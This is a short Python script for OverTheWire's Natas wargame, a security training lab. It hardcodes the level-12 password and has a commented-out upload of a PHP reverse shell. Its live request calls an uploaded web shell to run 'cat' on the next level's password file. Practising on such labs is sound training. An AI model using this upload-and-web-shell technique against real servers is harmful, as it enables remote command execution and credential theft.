#! /usr/bin/env python3.6
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
# Copyright 2020 leaundre leaundre.jackson87@gmail.com
#
# Distributed under terms of the %LICENSE% license.

"""
A script to use in Natas Wargame room in OvertheWire
"""

import re
import requests

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# response = session.get(url, auth=(username, password))
# response = session.post(url, files={"uploadedfile": open('revshell.php', 'rb')}, data={"filename": "revshell.php", "MAX_FILE_SIZE":
#                              "1000"}, auth=(username, password))

response = session.get(
    url + 'upload/qqzq86fcyb.php?c=cat /etc/natas_webpass/natas13', auth=(username, password))
content = response.text

print(content)
